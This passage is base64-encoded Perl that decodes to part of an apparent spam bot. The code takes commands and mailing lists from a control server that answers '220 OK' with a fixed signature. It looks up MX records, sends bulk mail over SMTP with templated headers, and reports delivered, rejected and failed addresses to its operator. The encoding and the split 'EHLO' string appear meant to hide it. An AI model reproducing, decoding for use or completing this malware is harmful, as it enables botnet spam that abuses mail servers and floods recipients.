LT5oYW5kbGVzXTsKZm9yZWFjaCBteSAkaGFuZGxlIChAJHJlYWRhYmxlKQp7CmlmICgkc2Vzc2lv
bi0+eyRoYW5kbGV9e2ZsYWdzZXR9ICYgJGZsYWdzZXQtPnt0aW1lb3V0fSkKewppZiAoJHNlc3Np
b24tPnskaGFuZGxlfXtzdGF0dXN9ID1+IC9ecnMvKQp7CiRzZXNzaW9uLT57JGhhbmRsZX17dGlt
ZW91dH0gPSAkdGltZSArICRzLT57dGltZW91dH07Cn0KZWxzZQp7CiRzZXNzaW9uLT57JGhhbmRs
ZX17dGltZW91dH0gPSAkdGltZSArICRiLT57dGltZW91dH07Cn0KJHNlc3Npb24tPnskaGFuZGxl
fXtmbGFnc2V0fSBePSAkZmxhZ3NldC0+e3RpbWVvdXR9Owp9CmVsc2lmICgkdGltZSA+PSAkc2Vz
c2lvbi0+eyRoYW5kbGV9e3RpbWVvdXR9KQp7CiRkZXN0cm95LT4oJHJlYWRlcnMsICRoYW5kbGUp
Owp9Cn0KJHJlYWRhYmxlID0gKElPOjpTZWxlY3QtPnNlbGVjdCgkcmVhZGVycywgdW5kZWYsIHVu
ZGVmLCAwKSlbMF07CmZvcmVhY2ggbXkgJGhhbmRsZSAoQCRyZWFkYWJsZSkKewpteSAkcmVzdWx0
OwppZiAoJHNlc3Npb24tPnskaGFuZGxlfXtzdGF0dXN9IGVxICJuc19yZCIpCnsKaWYgKCR0ZXN0
LT57dWRwNTN9WzBdID09IDApCnsKbXkgJHRlbXBidWZmZXIgPSAiIjsKaWYgKCRzZXNzaW9uLT57
JGhhbmRsZX17c2l6ZX0gPT0gMCkKewokaGFuZGxlLT5yZWN2KCR0ZW1wYnVmZmVyLCAoMiAtIGxl
bmd0aCAkc2Vzc2lvbi0+eyRoYW5kbGV9e2J1ZmZlcn0pKTsKJHNlc3Npb24tPnskaGFuZGxlfXti
dWZmZXJ9IC49ICR0ZW1wYnVmZmVyOwppZiAoMiA9PSBsZW5ndGggJHNlc3Npb24tPnskaGFuZGxl
fXtidWZmZXJ9KQp7CiRzZXNzaW9uLT57JGhhbmRsZX17c2l6ZX0gPSB1bnBhY2sgKCJuIiwgJHNl
c3Npb24tPnskaGFuZGxlfXtidWZmZXJ9KTsKJHNlc3Npb24tPnskaGFuZGxlfXtidWZmZXJ9ID0g
IiI7Cn0KbmV4dDsKfQokaGFuZGxlLT5yZWN2KCR0ZW1wYnVmZmVyLCAoJHNlc3Npb24tPnskaGFu
ZGxlfXtzaXplfSAtIGxlbmd0aCAkc2Vzc2lvbi0+eyRoYW5kbGV9e2J1ZmZlcn0pKTsKJHNlc3Np
b24tPnskaGFuZGxlfXtidWZmZXJ9IC49ICR0ZW1wYnVmZmVyOwppZiAoJHNlc3Npb24tPnskaGFu
ZGxlfXtzaXplfSA9PSBsZW5ndGggJHNlc3Npb24tPnskaGFuZGxlfXtidWZmZXJ9KQp7CiRyZXN1
bHQgPSAkc2Vzc2lvbi0+eyRoYW5kbGV9e3NpemV9Owp9Cn0KZWxzZQp7CiRyZXN1bHQgPSAkaGFu
ZGxlLT5yZWN2KCRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSwgNTEyKTsKJHJlc3VsdCA9IGxl
bmd0aCAkc2Vzc2lvbi0+eyRoYW5kbGV9e2J1ZmZlcn0gaWYgZGVmaW5lZCAkcmVzdWx0Owp9Cn0K
ZWxzZQp7CiRyZXN1bHQgPSBzeXNyZWFkICgkaGFuZGxlLCAkc2Vzc2lvbi0+eyRoYW5kbGV9e2J1
ZmZlcn0sIDE2Mzg0LCBsZW5ndGggJHNlc3Npb24tPnskaGFuZGxlfXtidWZmZXJ9KTsKfQppZiAo
ZGVmaW5lZCAkcmVzdWx0KQp7CmlmICgkcmVzdWx0ID4gMCkKewppZiAoJHNlc3Npb24tPnskaGFu
ZGxlfXtzdGF0dXN9IGVxICJyc19yZCIpCnsKbmV4dCBpZiA4ID4gbGVuZ3RoICRzZXNzaW9uLT57
JGhhbmRsZX17YnVmZmVyfTsKaWYgKCRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSAhfiAvXjIy
MCBPSy8pCnsKJGRlc3Ryb3ktPigkcmVhZGVycywgJGhhbmRsZSk7Cm5leHQ7Cn0KZWxzZQp7Cm15
ICRvZmZzZXQgPSBpbmRleCAoJHNlc3Npb24tPnskaGFuZGxlfXtidWZmZXJ9LCAiXHgwRFx4MEEi
KTsKbmV4dCB1bmxlc3MgJG9mZnNldCA+PSAwOwppZiAoJHNlc3Npb24tPnskaGFuZGxlfXtidWZm
ZXJ9ID1+IC9eKDIyMCkgT0tceDBEXHgwQS8pCnsKaWYgKCQxICF+IC9eMjIwLykKewokZGVzdHJv
eS0+KCRyZWFkZXJzLCAkaGFuZGxlKTsKbmV4dDsKfQokb2Zmc2V0ICs9IDI7Cm5leHQgaWYgMTAg
PiAobGVuZ3RoICRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSkgLSAkb2Zmc2V0OwpteSAkc2Vy
dmVyID0KewpzaWduCQk9PiAwLAp0aW1lb3V0CQk9PiAwLApyZXF1ZXN0CQk9PiAwLApjb21tYW5k
CQk9PiAwLApzaXplCQk9PiAwCn07CkBfID0gdW5wYWNrICgiUzJDMkwiLCBzdWJzdHIgKCRzZXNz
aW9uLT57JGhhbmRsZX17YnVmZmVyfSwgJG9mZnNldCwgMTApKTsKJHNlcnZlci0+eyRffSA9IHNo
aWZ0IEBfIGZvciAocXcgKHNpZ24gdGltZW91dCByZXF1ZXN0IGNvbW1hbmQgc2l6ZSkpOwppZiAo
JHNlcnZlci0+e3NpZ259ICE9IDB4NDMyMSkKewokZGVzdHJveS0+KCRyZWFkZXJzLCAkaGFuZGxl
KTsKbmV4dDsKfQokZmlyc3RfZXhlYyA9IDA7CmV4aXQgMCBpZiAkc2VydmVyLT57Y29tbWFuZH07
CiRzLT57dGltZW91dH0gPSAkc2VydmVyLT57dGltZW91dH07CiRzLT57cmVxdWVzdH0gPSAkc2Vy
dmVyLT57cmVxdWVzdH07CiRyZXF1ZXN0X3RpbWUgPSAkdGltZSArICRzLT57cmVxdWVzdH0gKiA2
MDsKdW5sZXNzICgkc2VydmVyLT57c2l6ZX0pCnsKJGRlc3Ryb3ktPigkcmVhZGVycywgJGhhbmRs
ZSk7Cm5leHQ7Cn0KJG9mZnNldCArPSAxMDsKbmV4dCBpZiAkc2VydmVyLT57c2l6ZX0gPiAobGVu
Z3RoICRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSkgLSAkb2Zmc2V0OwpzdWJzdHIgKCRzZXNz
aW9uLT57JGhhbmRsZX17YnVmZmVyfSwgMCwgJG9mZnNldCkgPSAiIjsKQF8gPSB1bnBhY2sgKCJM
YTQiLCBzdWJzdHIgKCRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSwgMCwgOCwgIiIpKTsKJGIt
PnskX30gPSBzaGlmdCBAXyBmb3IgKHF3IChpZCBpcCkpOwokYi0+e25hbWVzZXJ2ZXJ9ID0gW107
CnB1c2ggQHskYi0+e25hbWVzZXJ2ZXJ9fSwgc3Vic3RyICgkc2Vzc2lvbi0+eyRoYW5kbGV9e2J1
ZmZlcn0sIDAsIDQsICIiKSBmb3IgKDEuLjE2KTsKQF8gPSB1bnBhY2sgKCJTMkM0Iiwgc3Vic3Ry
ICgkc2Vzc2lvbi0+eyRoYW5kbGV9e2J1ZmZlcn0sIDAsIDgsICIiKSk7CiRiLT57JF99ID0gc2hp
ZnQgQF8gZm9yIChxdyAodGltZW91dCBzZXNzaW9uIGNvcGllcyBtZXRob2Qgc3BmIGxldmVsKSk7
CkB7JGItPnskX319ID0gc3BsaXQgKCJceDBBIiwgc3Vic3RyICgkc2Vzc2lvbi0+eyRoYW5kbGV9
e2J1ZmZlcn0sIDAsIHVucGFjayAoIkwiLCBzdWJzdHIgKCRzZXNzaW9uLT57JGhhbmRsZX17YnVm
ZmVyfSwgMCwgNCwgIiIpKSwgIiIpKSBmb3IgKHF3IChtYWlsYmFzZSBmcm9tIHJlcGx5dG8gc3Vi
amVjdCkpOwokY291bnRlcl9hZGRyID0gc2NhbGFyIEB7JGItPnttYWlsYmFzZX19OwpteSAkbWFp
bGJhc2VfdGVtcCA9IHt9Owp3aGlsZSAobXkgJG1haWxfdGVtcCA9IHNoaWZ0IEB7JGItPnttYWls
YmFzZX19KQp7Cm15ICgkaG9zdF90ZW1wKSA9ICZtYWlsKFwkbWFpbF90ZW1wKTsKJGhvc3RfdGVt
cCA9IGxjICgoc3BsaXQgL1xALywgJCRob3N0X3RlbXApWzFdKTsKJG1haWxiYXNlX3RlbXAtPnsk
aG9zdF90ZW1wfSA9IFtdIHVubGVzcyBleGlzdHMgJG1haWxiYXNlX3RlbXAtPnskaG9zdF90ZW1w
fTsKcHVzaCBAeyRtYWlsYmFzZV90ZW1wLT57JGhvc3RfdGVtcH19LCAkbWFpbF90ZW1wOwp9CmZv
cmVhY2ggbXkgJGhvc3RfdGVtcCAoa2V5cyAlJG1haWxiYXNlX3RlbXApCnsKd2hpbGUgKHNjYWxh
ciBAeyRtYWlsYmFzZV90ZW1wLT57JGhvc3RfdGVtcH19KQp7Cm15ICRtYWlsX3RlbXAgPSBbXTsK
Zm9yICgxLi4kYi0+e2NvcGllc30pCnsKbGFzdCB1bmxlc3Mgc2NhbGFyIEB7JG1haWxiYXNlX3Rl
bXAtPnskaG9zdF90ZW1wfX07CnB1c2ggQCRtYWlsX3RlbXAsIHNoaWZ0IEB7JG1haWxiYXNlX3Rl
bXAtPnskaG9zdF90ZW1wfX07Cn0KcHVzaCBAeyRiLT57bWFpbGJhc2V9fSwgJG1haWxfdGVtcDsK
fQp9CnVuZGVmICRtYWlsYmFzZV90ZW1wOwokYi0+e2hlYWRlcn0gPSBzdWJzdHIgKCRzZXNzaW9u
LT57JGhhbmRsZX17YnVmZmVyfSwgMCwgdW5wYWNrICgiTCIsIHN1YnN0ciAoJHNlc3Npb24tPnsk
aGFuZGxlfXtidWZmZXJ9LCAwLCA0LCAiIikpLCAiIik7CnVubGVzcyAoJGItPntoZWFkZXJ9KQp7
CiRiLT57aGVhZGVyfSA9IFsnRGF0ZTogJURBVEUlJywgJ0Zyb206ICVGUk9NQUREUiUnLCAnUmVw
bHktVG86ICVSRVBMWVRPQUREUiUnLCAnWC1Qcmlvcml0eTogJU5QUklPUklUWSUnLCAnTWVzc2Fn
ZS1JRDogPCVNRVNTQUdFSUQlQCVIRUxPJT4nLCAnVG86ICVUT0FERFIlJywgJ1N1YmplY3Q6ICVT
VUJKRUNUJSddOwokYi0+e2hlYWRlcn0gPSBqb2luICgiXHgwRFx4MEEiLCBAeyRiLT57aGVhZGVy
fX0sICdNSU1FLVZlcnNpb246IDEuMCcsICdDb250ZW50LVR5cGU6IHRleHQvJVRZUEUlOyBjaGFy
c2V0PSVDSEFSU0VUJScsICdDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nOiAlRU5DT0RJTkclJyk7
Cn0KJGItPntsZXR0ZXJ9ID0gc3Vic3RyICgkc2Vzc2lvbi0+eyRoYW5kbGV9e2J1ZmZlcn0sIDAs
IHVucGFjayAoIkwiLCBzdWJzdHIgKCRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSwgMCwgNCwg
IiIpKSwgIiIpOwokYi0+e2xldHRlcn0gPSAiIiB1bmxlc3MgJGItPntsZXR0ZXJ9OwokYi0+eyRf
fSA9IHVucGFjayAoIkMiLCBzdWJzdHIgKCRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSwgMCwg
MSwgIiIpKSBmb3IgKHF3IChwcmlvcml0eSB0eXBlKSk7CiRiLT57Y2hhcnNldH0gPSBzdWJzdHIg
KCRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSwgMCwgbGVuZ3RoICRzZXNzaW9uLT57JGhhbmRs
ZX17YnVmZmVyfSwgIiIpOwokYi0+e2lwfSA9IGpvaW4gKCIuIiwgdW5wYWNrICgiQzQiLCAkYi0+
e2lwfSkpOwp1bmxlc3MgKCRiLT57aGVsb30pCnsKaWYgKGRlZmluZWQgJHNfbnNleCkKewokYi0+
e2hlbG99ID0gJm5zcHRyKCRfID0gc29ja2FkZHJfaW4oMjUsICRzX25zZXgpLCAzLCAkYi0+e2lw
fSk7Cn0KZWxzZQp7CiRiLT57aGVsb30gPSAmbnNwdHIoJF8gPSBzb2NrYWRkcl9pbig1MywgJGIt
PntuYW1lc2VydmVyfVswXSksIDMsICRiLT57aXB9KTsKJGItPntoZWxvfSA9ICZuc3B0cigkXyA9
IHNvY2thZGRyX2luKDUzLCBwYWNrICgiQzQiLCBzcGxpdCAoL1wuLywgIjguOC44LjgiKSkpLCAz
LCAkYi0+e2lwfSkgdW5sZXNzICRiLT57aGVsb307Cn0KJGItPntoZWxvfSA9ICJsb2NhbGhvc3Qi
IHVubGVzcyAkYi0+e2hlbG99Owp9CiRiLT57cmVwb3J0fSA9ICJceDBBQ0xJRU5UIFYuJHMtPnt2
ZXJzaW9ufSBJUD0kYi0+e2lwfSBQVFI9JGItPntoZWxvfSBJRD0kYi0+e2lkfVx4MEFceDBBIiBp
ZiAkYi0+e2xldmVsfSA+IDE7CiRkZXN0cm95LT4oJHJlYWRlcnMsICRoYW5kbGUpOwpuZXh0Owp9
CmVsc2UKewokZGVzdHJveS0+KCRyZWFkZXJzLCAkaGFuZGxlKTsKbmV4dDsKfQp9Cn0KZWxzaWYg
KCRzZXNzaW9uLT57JGhhbmRsZX17c3RhdHVzfSBlcSAibnNfcmQiKQp7CmlmIChsZW5ndGggJHNl
c3Npb24tPnskaGFuZGxlfXtidWZmZXJ9KQp7Cm15ICgkcmVzcCwgJGNvZGUpID0gJm5zcGFyc2Vy
KFwkc2Vzc2lvbi0+eyRoYW5kbGV9e2J1ZmZlcn0sICRzZXNzaW9uLT57JGhhbmRsZX17c2VuZGVy
fSwgJHNlc3Npb24tPnskaGFuZGxlfXtwYWNrZXR9LCAkc2Vzc2lvbi0+eyRoYW5kbGV9e3R5cGV9
KTsKaWYgKCRyZXNwID09IDIpCnsKd2hpbGUgKCRfID0gc2hpZnQgQHskc2Vzc2lvbi0+eyRoYW5k
bGV9e29iamVjdH19KQp7CiRiLT57YmFkfVswXSArKzsKaWYgKCRiLT57bGV2ZWx9KQp7CiRiLT57
YmFkfVsxXSAuPSAiJF9ceDBBIjsKJGItPntyZXBvcnR9IC49ICIkXyAtIFtuc19yZF0gJGNvZGVc
eDBBIiBpZiAkYi0+e2xldmVsfSA+IDE7Cn0KfQp9CmVsc2lmICgkcmVzcCA9PSAxKQp7CiRyZXNw
ID0gc2hpZnQgQHskc2Vzc2lvbi0+eyRoYW5kbGV9e29iamVjdH19OwokYi0+e3VubHVja3l9WzBd
ICsrOwppZiAoJGItPntsZXZlbH0pCnsKJGItPnt1bmx1Y2t5fVsxXSAuPSAiJHJlc3BceDBBIjsK
JGItPntyZXBvcnR9IC49ICIkcmVzcCAtIFtuc19yZF0gJGNvZGVceDBBIiBpZiAkYi0+e2xldmVs
fSA+IDE7Cn0KcHVzaCBAeyRiLT57bWFpbGJhc2V9fSwgJHNlc3Npb24tPnskaGFuZGxlfXtvYmpl
Y3R9IGlmIHNjYWxhciBAeyRzZXNzaW9uLT57JGhhbmRsZX17b2JqZWN0fX07Cn0KZWxzZQp7CiRy
ZXNwID0gQHskc2Vzc2lvbi0+eyRoYW5kbGV9e29iamVjdH19WzBdOwooJHJlc3ApID0gJm1haWwo
XCRyZXNwKTsKJHJlc3AgPSBsYyAoKHNwbGl0IC9cQC8sICQkcmVzcClbMV0pOwokY2FjaGUtPnsk
cmVzcH1bMF0gPSAkY29kZTsKcHVzaCBAeyRiLT57bWFpbGJhc2V9fSwgJHNlc3Npb24tPnskaGFu
ZGxlfXtvYmplY3R9Owp9CmRlbGV0ZSAkc2Vzc2lvbi0+eyRoYW5kbGV9e29iamVjdH07CiRkZXN0
cm95LT4oJHJlYWRlcnMsICRoYW5kbGUpOwpuZXh0Owp9Cn0KZWxzaWYgKCRzZXNzaW9uLT57JGhh
bmRsZX17YnVmZmVyfSA9fiAvXlteXC1dezR9LipceDBEXHgwQSQvbSkKewppZiAoJHNlc3Npb24t
PnskaGFuZGxlfXtidWZmZXJ9ICF+IC9eKDJ8MykvKQp7CmlmICgkYi0+e2xldmVsfSA+IDEpCnsK
JHNlc3Npb24tPnskaGFuZGxlfXtidWZmZXJ9ID1+IHMvXHgwRC8vZzsKJHNlc3Npb24tPnskaGFu
ZGxlfXtidWZmZXJ9ID1+IHMvW1x4MDl8XHgwQV0rL1x4MjAvZzsKfQokc2Vzc2lvbi0+eyRoYW5k
bGV9e21pbmRleH0gLS0gaWYgJHNlc3Npb24tPnskaGFuZGxlfXttaW5kZXh9ID4gMDsKaWYgKCRz
ZXNzaW9uLT57JGhhbmRsZX17c3RhdHVzfSA9fiAvXm14XyhyZHxncikkLykKewp3aGlsZSAoJF8g
PSBzaGlmdCBAeyRzZXNzaW9uLT57JGhhbmRsZX17b2JqZWN0fX0pCnsKJGItPnt1bmx1Y2t5fVsw
XSArKzsKaWYgKCRiLT57bGV2ZWx9KQp7CiRiLT57dW5sdWNreX1bMV0gLj0gIiRfXHgwQSI7CiRi
LT57cmVwb3J0fSAuPSAiJF8gLSBbJHNlc3Npb24tPnskaGFuZGxlfXtzdGF0dXN9XSBCYWQgaG9z
dCAkc2Vzc2lvbi0+eyRoYW5kbGV9e2J1ZmZlcn1ceDBBIiBpZiAkYi0+e2xldmVsfSA+IDE7Cn0K
fQpkZWxldGUgJHNlc3Npb24tPnskaGFuZGxlfXtvYmplY3R9OwokZGVzdHJveS0+KCRyZWFkZXJz
LCAkaGFuZGxlKTsKbmV4dDsKfQplbHNpZiAoJHNlc3Npb24tPnskaGFuZGxlfXtzdGF0dXN9ID1+
IC9ebXhfKG1mfHJ0KSQvKQp7CmlmICgkc2Vzc2lvbi0+eyRoYW5kbGV9e2J1ZmZlcn0gPX4gL1xk
K1wuXGQrXC5cZCtcLlxkKy9nIHx8ICRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSA9fiAvKCBp
cCB8YmxvY2t8YmxhY2t8cmVqZWN0fGxhdGVyfG1hbnkpL2lnKQp7CndoaWxlICgkXyA9IHNoaWZ0
IEB7JHNlc3Npb24tPnskaGFuZGxlfXtvYmplY3R9fSkKewokYi0+e3VubHVja3l9WzBdICsrOwpp
ZiAoJGItPntsZXZlbH0pCnsKJGItPnt1bmx1Y2t5fVsxXSAuPSAiJF9ceDBBIjsKJGItPntyZXBv
cnR9IC49ICIkXyAtIFskc2Vzc2lvbi0+eyRoYW5kbGV9e3N0YXR1c31dIEJhZCBob3N0ICRzZXNz
aW9uLT57JGhhbmRsZX17YnVmZmVyfVx4MEEiIGlmICRiLT57bGV2ZWx9ID4gMTsKfQp9CmRlbGV0
ZSAkc2Vzc2lvbi0+eyRoYW5kbGV9e29iamVjdH07CiRkZXN0cm95LT4oJHJlYWRlcnMsICRoYW5k
bGUpOwpuZXh0Owp9CmVsc2UKewokYi0+e2JhZH1bMF0gKys7CmlmICgkYi0+e2xldmVsfSkKewok
Yi0+e2JhZH1bMV0gLj0gIiRzZXNzaW9uLT57JGhhbmRsZX17b2JqZWN0fVskc2Vzc2lvbi0+eyRo
YW5kbGV9e21pbmRleH1dXHgwQSI7CiRiLT57cmVwb3J0fSAuPSAiJHNlc3Npb24tPnskaGFuZGxl
fXtvYmplY3R9WyRzZXNzaW9uLT57JGhhbmRsZX17bWluZGV4fV0gLSBbJHNlc3Npb24tPnskaGFu
ZGxlfXtzdGF0dXN9XSBJbnZhbGlkIHJlY2lwaWVudCAkc2Vzc2lvbi0+eyRoYW5kbGV9e2J1ZmZl
cn1ceDBBIiBpZiAkYi0+e2xldmVsfSA+IDE7Cn0Kc3BsaWNlIEB7JHNlc3Npb24tPnskaGFuZGxl
fXtvYmplY3R9fSwgJHNlc3Npb24tPnskaGFuZGxlfXttaW5kZXh9LCAxOwp1bmxlc3MgKHNjYWxh
ciBAeyRzZXNzaW9uLT57JGhhbmRsZX17b2JqZWN0fX0pCnsKZGVsZXRlICRzZXNzaW9uLT57JGhh
bmRsZX17b2JqZWN0fTsKJGRlc3Ryb3ktPigkcmVhZGVycywgJGhhbmRsZSk7Cm5leHQ7Cn0KfQp9
CmVsc2UKewokYi0+e3VubHVja3l9WzBdICsrOwppZiAoJGItPntsZXZlbH0pCnsKJGItPnt1bmx1
Y2t5fVsxXSAuPSAiJHNlc3Npb24tPnskaGFuZGxlfXtvYmplY3R9WyRzZXNzaW9uLT57JGhhbmRs
ZX17bWluZGV4fV1ceDBBIjsKJGItPntyZXBvcnR9IC49ICIkc2Vzc2lvbi0+eyRoYW5kbGV9e29i
amVjdH1bJHNlc3Npb24tPnskaGFuZGxlfXttaW5kZXh9XSAtIFskc2Vzc2lvbi0+eyRoYW5kbGV9
e3N0YXR1c31dIERlbGl2ZXJ5IGVycm9yICRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfVx4MEEi
IGlmICRiLT57bGV2ZWx9ID4gMTsKfQpzcGxpY2UgQHskc2Vzc2lvbi0+eyRoYW5kbGV9e29iamVj
dH19LCAkc2Vzc2lvbi0+eyRoYW5kbGV9e21pbmRleH0sIDE7CnB1c2ggQHskYi0+e21haWxiYXNl
fX0sICRzZXNzaW9uLT57JGhhbmRsZX17b2JqZWN0fSBpZiBzY2FsYXIgQHskc2Vzc2lvbi0+eyRo
YW5kbGV9e29iamVjdH19OwpkZWxldGUgJHNlc3Npb24tPnskaGFuZGxlfXtvYmplY3R9OwokZGVz
dHJveS0+KCRyZWFkZXJzLCAkaGFuZGxlKTsKbmV4dDsKfQp9CmlmICgkc2Vzc2lvbi0+eyRoYW5k
bGV9e3N0YXR1c30gZXEgIm14X3JkIikKewpteSAkaGVsbyA9ICRiLT57aGVsb307CiRzZXNzaW9u
LT57JGhhbmRsZX17YnVmZmVyfSA9ICJFIi4iSCI7CiRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVy
fSAuPSAiTCIuIk8iLiIgJGhlbG9ceDBEXHgwQSI7CiRzZXNzaW9uLT57JGhhbmRsZX17c3RhdHVz
fSA9ICJteF9nciI7Cn0KZWxzaWYgKCRzZXNzaW9uLT57JGhhbmRsZX17c3RhdHVzfSBlcSAibXhf
Z3IiKQp7Cm15ICgkbWFpbCkgPSAmbWFpbChcJHNlc3Npb24tPnskaGFuZGxlfXtzZW5kZXJ9KTsK
JHNlc3Npb24tPnskaGFuZGxlfXtidWZmZXJ9ID0gIk1BSUwgIjsKJHNlc3Npb24tPnskaGFuZGxl
fXtidWZmZXJ9IC49ICJGUk9NOiA8JCRtYWlsPlx4MERceDBBIjsKJHNlc3Npb24tPnskaGFuZGxl
fXtzdGF0dXN9ID0gIm14X21mIjsKfQplbHNpZiAoJHNlc3Npb24tPnskaGFuZGxlfXtzdGF0dXN9
IGVxICJteF9tZiIpCnsKbXkgKCRtYWlsKSA9ICZtYWlsKFwkc2Vzc2lvbi0+eyRoYW5kbGV9e29i
amVjdH1bJHNlc3Npb24tPnskaGFuZGxlfXttaW5kZXh9XSk7CiRzZXNzaW9uLT57JGhhbmRsZX17
YnVmZmVyfSA9ICJSQ1BUIFRPOiA8JCRtYWlsPlx4MERceDBBIjsKJHNlc3Npb24tPnskaGFuZGxl
fXttaW5kZXh9ICsrOwokc2Vzc2lvbi0+eyRoYW5kbGV9e3N0YXR1c30gPSAkc2Vzc2lvbi0+eyRo
YW5kbGV9e21pbmRleH0gPj0gc2NhbGFyIEB7JHNlc3Npb24tPnskaGFuZGxlfXtvYmplY3R9fSA/
ICJteF9ydCIgOiAibXhfbWYiOwp9CmVsc2lmICgkc2Vzc2lvbi0+eyRoYW5kbGV9e3N0YXR1c30g
ZXEgIm14X3J0IikKewokc2Vzc2lvbi0+eyRoYW5kbGV9e2J1ZmZlcn0gPSAiREFUQVx4MERceDBB
IjsKJHNlc3Npb24tPnskaGFuZGxlfXtzdGF0dXN9ID0gIm14X2R0IjsKfQplbHNpZiAoJHNlc3Np
b24tPnskaGFuZGxlfXtzdGF0dXN9IGVxICJteF9kdCIpCnsKJHNlc3Npb24tPnskaGFuZGxlfXti
dWZmZXJ9ID0gJmRhdGEoJHNlc3Npb24tPnskaGFuZGxlfXtvYmplY3R9LCAkc2Vzc2lvbi0+eyRo
YW5kbGV9e3NlbmRlcn0sICRiKTsKJHNlc3Npb24tPnskaGFuZGxlfXtidWZmZXJ9IC49ICJceDBE
XHgwQS5ceDBEXHgwQSI7CiRzZXNzaW9uLT57JGhhbmRsZX17c3RhdHVzfSA9ICJteF9kciI7Cn0K
ZWxzaWYgKCRzZXNzaW9uLT57JGhhbmRsZX17c3RhdHVzfSBlcSAibXhfZHIiKQp7CiRiLT57Z29v
ZH1bMF0gKz0gc2NhbGFyIEB7JHNlc3Npb24tPnskaGFuZGxlfXtvYmplY3R9fTsKaWYgKCRiLT57
bGV2ZWx9KQp7CndoaWxlICgkXyA9IHNoaWZ0IEB7JHNlc3Npb24tPnskaGFuZGxlfXtvYmplY3R9
fSkKewokYi0+e2dvb2R9WzFdIC49ICIkX1x4MEEiOwp9Cn0KZGVsZXRlICRzZXNzaW9uLT57JGhh
bmRsZX17b2JqZWN0fTsKJHNlc3Npb24tPnskaGFuZGxlfXtidWZmZXJ9ID0gIlFVSVRceDBEXHgw
QSI7CiRzZXNzaW9uLT57JGhhbmRsZX17c3RhdHVzfSA9ICJteF9xdCI7Cn0KZWxzZQp7CiRkZXN0
cm95LT4oJHJlYWRlcnMsICRoYW5kbGUpOwpuZXh0Owp9CnVubGVzcyAoJHdyaXRlcnMtPmFkZCgk
aGFuZGxlKSkKewokZGVzdHJveS0+KCRyZWFkZXJzLCAkaGFuZGxlKTsKbmV4dDsKfQokcmVhZGVy
cy0+cmVtb3ZlKCRoYW5kbGUpOwp9Cn0KZWxzZQp7CiRkZXN0cm95LT4oJHJlYWRlcnMsICRoYW5k
bGUpOwpuZXh0Owp9Cn0KZWxzaWYgKCQhID09ICRld2Jsb2NrKQp7Cm5leHQ7Cn0KZWxzZQp7CiRk
ZXN0cm95LT4oJHJlYWRlcnMsICRoYW5kbGUpOwpuZXh0Owp9Cn0KfQp9CnN1YiBuc3VucGFjawp7
Cm15ICgkcGFja2V0LCAkb2Zmc2V0KSA9IEBfOwpteSAoJGxlbmd0aCwgJHNpemUsICRuYW1lLCAk
bmV4dCkgPSAobGVuZ3RoICQkcGFja2V0LCAwLCAiIiwgIiIpOwp3aGlsZSAoMSkKewpyZXR1cm4g
aWYgJGxlbmd0aCA8ICgkb2Zmc2V0ICsgMSk7CiRzaXplID0gdW5wYWNrICgiXEAkb2Zmc2V0IEMi
LCAkJHBhY2tldCk7CmlmICgkc2l6ZSA9PSAwKQp7CiRvZmZzZXQgKys7Cmxhc3Q7Cn0KZWxzaWYg
KCgkc2l6ZSAmIDE5MikgPT0gMTkyKQp7CnJldHVybiBpZiAkbGVuZ3RoIDwgKCRvZmZzZXQgKyAy
KTsKJG5leHQgPSB1bnBhY2sgKCJcQCRvZmZzZXQgbiIsICQkcGFja2V0KTsKJG5leHQgJj0gMTYz
ODM7CigkbmV4dCkgPSAmbnN1bnBhY2soJHBhY2tldCwgJG5leHQpOwpyZXR1cm4gaWYgIWRlZmlu
ZWQgJG5leHQ7CiRuYW1lIC49ICRuZXh0Owokb2Zmc2V0ICs9IDI7Cmxhc3Q7Cn0KZWxzZQp7CiRv
ZmZzZXQgKys7CnJldHVybiBpZiAkbGVuZ3RoIDwgKCRvZmZzZXQgKyAkc2l6ZSk7CiRuZXh0ID0g
c3Vic3RyICgkJHBhY2tldCwgJG9mZnNldCwgJHNpemUpOwokbmFtZSAuPSAiJG5leHQuIjsKJG9m
ZnNldCArPSAkc2l6ZTsKfQp9CiRuYW1lID1+IHMvXC4kLy87CnJldHVybiBpZiAhbGVuZ3RoICRu
YW1lOwpyZXR1cm4gKCRuYW1lLCAkb2Zmc2V0KTsKfQpzdWIgbnNyZWNvcmQKewpteSAoJHBhY2tl
dCwgJG9mZnNldCkgPSBAXzsKbXkgKCRsZW5ndGgsICRuYW1lKSA9IChsZW5ndGggJCRwYWNrZXQs
ICIiKTsKKCRuYW1lLCAkb2Zmc2V0KSA9ICZuc3VucGFjaygkcGFja2V0LCAkb2Zmc2V0KTsKcmV0
dXJuIGlmICFkZWZpbmVkICRuYW1lIHx8ICRsZW5ndGggPCAoJG9mZnNldCArIDEwKTsKbXkgKCRy
dHlwZSwgJHJjbGFzcywgJHJ0dGwsICRybGVuZ3RoKSA9IHVucGFjayAoIlxAJG9mZnNldCBuMk5u
IiwgJCRwYWNrZXQpOwokb2Zmc2V0ICs9IDEwOwpyZXR1cm4gaWYgJGxlbmd0aCA8ICgkb2Zmc2V0
ICsgJHJsZW5ndGgpOwpyZXR1cm4gKCRuYW1lLCAkb2Zmc2V0LCAkcnR5cGUsICRyY2xhc3MsICRy
dHRsLCAkcmxlbmd0aCk7Cn0Kc3ViIG5zcGFyc2VyCnsKbXkgKCRwYWNrZXQsICRvZmZzZXQsICRz
ZXF1ZW5jZSwgJHR5cGUpID0gQF87Cm15ICgkbGVuZ3RoLCAkbmFtZSkgPSAobGVuZ3RoICQkcGFj
a2V0LCAiIik7CnJldHVybiAoMSwgIkJyb2tlbiBoZWFkZXIiKSBpZiAkbGVuZ3RoIDwgMTI7CkBf
ID0gdW5wYWNrICgibkMybjQiLCAkJHBhY2tldCk7Cm15ICRoZWFkZXIgPQp7CmlkCQk9PiAkX1sw
